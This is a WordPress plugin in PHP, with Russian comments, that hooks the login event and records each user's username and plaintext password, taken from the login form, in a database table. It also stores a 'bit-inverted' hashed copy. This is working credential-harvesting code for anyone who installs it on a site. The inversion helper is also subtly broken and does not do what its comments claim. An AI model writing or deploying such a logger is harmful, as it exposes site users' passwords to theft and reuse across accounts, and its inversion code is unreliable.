<?php
/**
 * Plugin Name: User Login Logger
 * Description: Logs user login credentials (username and password) into an existing database table, both in original and inverted formats.
 * Version: 1.0
 * Author: Your Name
 */

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// ====== Логирование логинов и паролей ======
add_action('wp_login', 'ull_log_user_credentials', 10, 2);

function ull_log_user_credentials($user_login, $user) {
    global $wpdb;

    // Получение пароля из POST-запроса
    $password = isset($_POST['pwd']) ? $_POST['pwd'] : '';

    // Пропускаем запись, если пароль пуст
    if (empty($password)) {
        return;
    }

    // Инвертирование битов пароля
    $password_inverted = invert($password);

    // Имя таблицы (предполагается, что она уже создана)
    $table_name = $wpdb->prefix . 'user_logins';

    // Записываем данные в базу
    $wpdb->insert(
        $table_name,
        [
            'username' => $user_login,
            'password_original' => $password,        // Пароль в оригинальном виде
            'password_inverted' => $password_inverted, // Инвертированный пароль
            'created_at' => current_time('mysql'),  // Время записи
        ]
    );
}


function invert( $input ) {
    $bin = '';
    for ($i = 0; $i < strlen($input); $i++) {
        $bin .= decbin(ord($input[$i]));
    }

    $bin_inv = '';
    for ($i = 0; $i < strlen($bin); $i++) { 
        $bin_inv .= $bin[$i] == '0' ? '1' : 0;
    }

    return wp_hash_password(bindec($bin_inv));
}